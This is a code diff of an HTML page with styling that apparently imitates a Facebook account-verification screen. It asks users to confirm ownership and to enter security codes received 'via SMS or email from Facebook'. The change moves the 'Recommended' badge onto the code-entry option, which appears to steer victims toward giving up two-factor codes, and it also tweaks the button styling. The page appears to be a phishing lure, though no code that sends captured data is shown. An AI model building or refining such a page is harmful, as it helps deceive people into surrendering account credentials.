@@ -15,17 +15,17 @@
   
   <div class="security-options">
     <div class="option-card">
-      <div class="option-header">
-        <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 1: Login Approval</h4>
-        <div class="option-badge">Recommended</div>
-      </div>
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 1: Login Approval</h4>
       <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
         For account security, please verify you are the authorized account owner. We've sent a login notification to your registered device. Approve the request to proceed with authentication.
       </p>
     </div>
 
     <div class="option-card">
-      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 2: Verification Code</h4>
+      <div class="option-header">
+        <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 2: Verification Code</h4>
+        <div class="option-badge">Recommended</div>
+      </div>
       <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
         If you received a security code via SMS or email from Facebook, please enter it below to complete the verification process.
       </p>
@@ -122,13 +122,13 @@
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  box-shadow: 0 4px 12px rgba(24,119,242,0.25);
   display: block;
   margin-top: 8px;
 }
 .login-btn:hover {
   background: #166fe5;
-  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
+  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
 }
 .login-btn:active {
   transform: scale(0.985);
